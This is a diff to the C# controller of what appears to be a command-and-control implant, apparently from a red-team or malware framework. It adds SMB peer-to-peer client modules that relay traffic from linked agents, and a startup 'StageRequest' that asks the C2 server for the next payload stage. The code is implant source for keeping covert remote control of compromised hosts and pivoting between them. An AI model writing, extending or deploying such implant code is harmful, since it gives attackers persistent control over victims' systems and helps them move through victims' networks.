@@ -1,17 +1,16 @@
-﻿using System;
-using System.Collections.Generic;
-using System.IO.Pipes;
-using System.Linq;
-using System.Text;
-
-using AgentCore.Interfaces;
-using AgentCore.Models;
-using AgentCore.Modules;
+﻿using Agent.Interfaces;
+using Agent.Models;
+using Agent.Modules;
 
 using Common;
 using Common.Models;
 
-namespace AgentCore.Controllers
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+
+namespace Agent.Controllers
 {
     public class AgentController
     {
@@ -22,6 +21,7 @@ namespace AgentCore.Controllers
         public List<string> IdempotencyKeys { get; set; } = new List<string>();
         public List<AgentModule> AgentModules { get; private set; } = new List<AgentModule>();
         public List<TcpClientModule> TcpClients { get; set; } = new List<TcpClientModule>();
+        public List<SmbClientModule> SmbClients { get; set; } = new List<SmbClientModule>();
 
         public delegate void OnAgentCommand(byte[] data);
 
@@ -57,6 +57,9 @@ namespace AgentCore.Controllers
 
             CommModule.Start();
 
+            // ask for stage one
+            CommModule.SendData(new AgentMessage { IdempotencyKey = Guid.NewGuid().ToString(), Metadata = new AgentMetadata(), Data = new C2Data { Module = "Core", Command = "StageRequest" } });
+
             while (AgentStatus == AgentStatus.Running)
             {
                 CheckKillConditions();
@@ -72,6 +75,14 @@ namespace AgentCore.Controllers
                 foreach (var tcpClient in TcpClients)
                 {
                     if (tcpClient.ModuleStatus == ModuleStatus.Running && tcpClient.RecvData(out AgentMessage outgoing))
+                    {
+                        CommModule.SendData(outgoing);
+                    }
+                }
+
+                foreach (var smbClient in SmbClients)
+                {
+                    if (smbClient.ModuleStatus == ModuleStatus.Running && smbClient.RecvData(out AgentMessage outgoing))
                     {
                         CommModule.SendData(outgoing);
                     }
@@ -176,6 +187,11 @@ namespace AgentCore.Controllers
                 foreach (var tcpClient in TcpClients) // how lazy is this!!!!
                 {
                     tcpClient.SendData(message);
+                }
+
+                foreach (var smbClient in SmbClients)  // kill me now.
+                {
+                    smbClient.SendData(message);
                 }
             }
         }
